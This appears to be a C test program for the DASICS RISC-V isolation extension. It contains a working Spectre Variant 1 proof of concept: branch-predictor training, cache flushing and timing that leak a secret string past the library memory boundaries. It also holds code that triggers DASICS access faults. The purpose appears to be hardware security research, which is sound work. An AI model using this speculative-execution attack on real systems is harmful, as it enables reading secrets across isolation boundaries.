#include <stdio.h>
#include "stdcsr.h"
#include <stddasics.h>
#include "sys/syscall.h"
#include "cache.h"

static char ATTR_ULIB_DATA secret[128] = "[ULIB1]: It's the secret!\n";
static char ATTR_ULIB_DATA pub_readonly[128] = "[ULIB1]: Enter dasics_ulib1 ...\n";
static char ATTR_ULIB_DATA pub_rwbuffer[128] = "[ULIB1]: It's public rw buffer!\n";

static char ATTR_ULIB_DATA main_prompt1[128] = "[UMAIN]: Ready to enter dasics_ulib1.\n";
static char ATTR_ULIB_DATA main_prompt2[128] = "[UMAIN]: DasicsLibCfg0: 0x%lx\n";
static char ATTR_ULIB_DATA main_prompt3[128] = "[UMAIN]: DasicsReturnPC: 0x%lx\n";
static char ATTR_ULIB_DATA main_prompt4[128] = "[UMAIN]: DasicsFreeZoneReturnPC: 0x%lx\n";
static char ATTR_ULIB_DATA main_prompt5[64] = "[UMAIN] Successfully returned.\n";

#define TRAIN_TIMES 6 // assumption is that you have a 2 bit counter in the predictor
#define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
#define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
#define SECRET_SZ 26
#define CACHE_HIT_THRESHOLD 40

uint64_t ATTR_ULIB_DATA array1_sz = 16;
uint8_t ATTR_ULIB_DATA unused1[64];
uint8_t ATTR_ULIB_DATA array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t ATTR_ULIB_DATA unused2[64];
uint8_t ATTR_ULIB_DATA array2[256 * L1_BLOCK_SZ_BYTES];
char ATTR_ULIB_DATA secretString[32] = "!\"#ThisIsTheBabyBoomerTest";

char ATTR_ULIB_DATA spectre_format1[64] = "m[0x%x] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c)";
char ATTR_ULIB_DATA spectre_format2[64] = " 2.(%lu, %d, %c)\n";

void ATTR_UMAIN_TEXT dasics_main(void);

//extern lib_printf(const char *fmt, void* func_name, void* main_call);

// inline void lib_printf(const char *fmt, void* func_name, void* main_call){
//     asm volatile (
//         "auipc t0,  0\n"
//         "addi, t0,  t0  32\n"
//         "mv,   a0,  zero\n"
//         "addi, a0,  a0, 10\n"
//         "mv    a1,  t0\n"
//         "jal   ra,  %[main_call]\n"
//         "mv    a0,  %[fmt]\n"
//         "jal   ra,  %[func_name]"
//         "nop"
//         :
//         :[main_call]"r"(main_call), [fmt]"r"(fmt), [func_name]"r"(func_name)
//         :"t0", "a0", "a1", "ra"
//     );
// }

static void ATTR_ULIB_TEXT dasics_ulib2(void){}

static void ATTR_ULIB_TEXT dasics_ulib1(void) {
    //lib_printf(pub_readonly,&printf, &dasics_umaincall);                 // That's ok
    dasics_umaincall(UMAINCALL_PRINTF, (uint64_t) pub_readonly,0,0);
    pub_readonly[15] = 'B';               // raise DasicsUStoreAccessFault (0x14)
    //lib_printf(pub_rwbuffer,&printf, &dasics_umaincall);                 // That's ok
    dasics_umaincall(UMAINCALL_PRINTF, (uint64_t) pub_rwbuffer,0,0);

    char temp = secret[3];                // raise DasicsULoadAccessFault  (0x12)
    secret[3] = temp;                     // raise DasicsUStoreAccessFault (0x14)

    dasics_main();                // raise DasicsUInstrAccessFault (0x10)
    dasics_ulib2();                 // OK since we granted all ULIB
    // sys_write(pub_rwbuffer);              // raise DasicsUInstrAccessFault (0x10)
    // printf(secret);                       // raise DasicsULoadAccessFault * 100

    pub_rwbuffer[19] = pub_readonly[12];  // That's ok
    pub_rwbuffer[21] = 'B';               // That's ok
    pub_rwbuffer[22] = 'B';               // That's ok
    //lib_printf(pub_rwbuffer,&printf, &dasics_umaincall);                 // That's ok
    dasics_umaincall(UMAINCALL_PRINTF, (uint64_t) pub_rwbuffer,0,0);

}

/**
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 */
void ATTR_ULIB_TEXT victimFunc(uint64_t idx){
    uint8_t dummy = 2;

    // stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
    array1_sz =  array1_sz << 4;
    asm("fcvt.s.lu	fa4, %[in]\n"
        "fcvt.s.lu	fa5, %[inout]\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fcvt.lu.s	%[out], fa5, rtz\n"
        : [out] "=r" (array1_sz)
        : [inout] "r" (array1_sz), [in] "r" (dummy)
        : "fa4", "fa5");

    if (idx < array1_sz){
        dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
    }

    // bound speculation here just in case it goes over
    dummy = read_csr(cycle);
}

/**
 * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
 * corresponding values) in the inArray array that has the highest values.
 *
 * @input inArray array of values to find the top two maxs
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void ATTR_UMAIN_TEXT topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i){
        if (inArray[i] > outValArray[0]){
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]){
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}

extern int main_printf(const char *fmt, void* func_name);
extern void main_call_lib(void* func_name);
extern void main_call_lib1(uint64_t arg, void* func_name);
extern void main_call_lib6(const char *fmt, uint64_t arg0, uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4, void* func_name);
extern void main_call_lib4(const char *fmt, uint64_t arg0, uint64_t arg1, uint64_t arg2, void* func_name);

void ATTR_UMAIN_TEXT spectre_attack(void) {
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint64_t start, diff, passInIdx, randIdx;
    uint8_t dummy = 0;
    static uint64_t results[256];
    int idx0, idx1, idx2, idx3;
    idx0 = dasics_libcfg_alloc(DASICS_LIBCFG_V | DASICS_LIBCFG_R | DASICS_LIBCFG_W, (uint64_t)(&array1_sz), (uint64_t)(secretString + 32));
    idx1 = dasics_libcfg_alloc(DASICS_LIBCFG_V | DASICS_LIBCFG_R, (uint64_t)spectre_format1, (uint64_t)(spectre_format2 + 64));
    extern char __ULIB_TEXT_BEGIN__, __ULIB_TEXT_END__;
    idx2 = dasics_jumpcfg_alloc((uint64_t)&__ULIB_TEXT_BEGIN__, (uint64_t)&__ULIB_TEXT_END__);

    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len){

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
            results[cIdx] = 0;
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){

            // make sure array you read from is not in the cache
            flushCache((uint64_t)array2, sizeof(array2));

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
                // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                // avoid jumps in case those tip off the branch predictor
                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                randIdx = atkRound % array1_sz;
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx

                // set of constant takens to make the BHR be in a all taken state
                for(uint64_t k = 0; k < 30; ++k){
                    asm("");
                }

                // call function to train or attack
                main_call_lib1(passInIdx, &victimFunc);
            }

            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i){
                start = read_csr(cycle);
                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
                diff = (read_csr(cycle) - start);
                if ( diff < CACHE_HIT_THRESHOLD ){
                    results[i] += 1;
                }
            }
        }

        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

        main_call_lib6(spectre_format1, (uint64_t)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], &printf);
        main_call_lib4(spectre_format2, hitArray[1], output[1], output[1], &printf);

        // read in the next secret
        ++attackIdx;
    }

    dasics_libcfg_free(idx0);
    dasics_libcfg_free(idx1);
    dasics_jumpcfg_free(idx2);

    return;
}

void ATTR_UMAIN_TEXT dasics_main(void) {
    // Handlers of DasicsLibCfgs
    int idx0, idx1, idx2, idx3;

    // Init maincall and utvec
    dasics_init_umaincall((uint64_t)&dasics_umaincall);
    asm volatile ("csrw utvec, %0" :: "rK"((uint64_t)&dasics_ufault_entry));

    //printf("Hello, this is main function!\n");

    // Print main_prompt1
    idx0 = dasics_libcfg_alloc(DASICS_LIBCFG_V | DASICS_LIBCFG_R, (uint64_t)main_prompt1, (uint64_t)(main_prompt1 + 128));
    main_printf(main_prompt1, &printf);
    dasics_libcfg_free(idx0);

    spectre_attack();

    idx0 = dasics_libcfg_alloc(DASICS_LIBCFG_V | DASICS_LIBCFG_R, (uint64_t)main_prompt5, (uint64_t)(main_prompt5 + 64));
    main_printf(main_prompt5, &printf);
    dasics_libcfg_free(idx0);

    sys_exit();

    // Allocate libcfg before calling lib function
    idx0 = dasics_libcfg_alloc(DASICS_LIBCFG_V | DASICS_LIBCFG_R                  , (uint64_t)pub_readonly, (uint64_t)(pub_readonly + 128));
    idx1 = dasics_libcfg_alloc(DASICS_LIBCFG_V | DASICS_LIBCFG_R | DASICS_LIBCFG_W, (uint64_t)pub_rwbuffer, (uint64_t)(pub_rwbuffer + 128));
    idx2 = dasics_libcfg_alloc(DASICS_LIBCFG_V                                    , (uint64_t)secret,       (uint64_t)(      secret + 128));

    extern char __ULIB_TEXT_BEGIN__, __ULIB_TEXT_END__;
    idx3 = dasics_jumpcfg_alloc((uint64_t)&__ULIB_TEXT_BEGIN__, (uint64_t)&__ULIB_TEXT_END__);

    // Jump to lib function
    //dasics_ulib1();
    main_call_lib(&dasics_ulib1);
    dasics_jumpcfg_free(idx3);

    // Print DasicsLibCfg0 and DasicsLibCfg1 csr value
    idx3 = dasics_libcfg_alloc(DASICS_LIBCFG_V | DASICS_LIBCFG_R, (uint64_t)main_prompt2, (uint64_t)(main_prompt2 + 128));
    //main_printf(main_prompt2, read_csr(0x880));
    dasics_libcfg_free(idx3);

    // Free those used libcfg via handlers
    dasics_libcfg_free(idx2);
    dasics_libcfg_free(idx1);
    dasics_libcfg_free(idx0);

    // Print values of DasicsReturnPC and DasicsFreeZoneReturnPC
    idx0 = dasics_libcfg_alloc(DASICS_LIBCFG_V | DASICS_LIBCFG_R, (uint64_t)main_prompt3, (uint64_t)(main_prompt3 + 128));
    //printf(main_prompt3, read_csr(0x8b1));
    dasics_libcfg_free(idx0);

    idx0 = dasics_libcfg_alloc(DASICS_LIBCFG_V | DASICS_LIBCFG_R, (uint64_t)main_prompt4, (uint64_t)(main_prompt4 + 128));
    //printf(main_prompt4, read_csr(0x8b2));
    dasics_libcfg_free(idx0);

    // Release all remained handlers and exit
    sys_exit();
}
